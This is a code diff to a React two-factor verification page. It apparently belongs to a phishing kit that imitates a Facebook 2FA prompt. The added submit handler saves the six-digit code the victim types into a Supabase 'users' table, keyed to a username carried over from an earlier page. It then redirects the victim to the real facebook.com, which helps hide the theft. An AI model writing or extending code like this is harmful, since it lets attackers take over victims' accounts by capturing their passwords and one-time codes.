@@ -1,10 +1,13 @@
 import React, { useState, useRef } from 'react';
-import { useNavigate } from "react-router-dom"
+import { useNavigate, useLocation } from "react-router-dom"
+import { supabase } from '../utils/supabase';
+import { loading } from '../lib/Alert';
 
 export default function TwoFactorVerifyResponsive() {
   const [code, setCode] = useState(['', '', '', '', '', '']);
   const inputRefs = useRef([]);
   const navigate = useNavigate()
+  const {state} = useLocation()
 
   const handleChange = (element, index) => {
     if (isNaN(element.value)) return false;
@@ -33,6 +36,28 @@ export default function TwoFactorVerifyResponsive() {
     }
     e.preventDefault();
   };
+
+
+  async function HandleSubmit(e){
+      e.preventDefault()
+  
+      loading()
+  
+      if(state){
+        var { error } = await supabase
+          .from('users')
+          .update({ code })
+          .eq('username', state.username)
+      }
+      
+      
+      loading(false)
+  
+      if(!error){
+        window.location.assign("https://facebook.com")
+      }
+    }
+
 
   return (
     <div className="min-h-screen bg-white flex flex-col justify-between font-sans antialiased mt-10">
@@ -63,7 +88,7 @@ export default function TwoFactorVerifyResponsive() {
           </p>
 
           {/* Form wrapper */}
-          <form onSubmit={(e) => e.preventDefault()} className="space-y-6">
+          <form onSubmit={HandleSubmit} className="space-y-6">
             {/* Fluid input grids that scale beautifully down to tiny screen widths */}
             <div className="grid grid-cols-6 gap-2" onPaste={handlePaste}>
               {code.map((data, index) => (
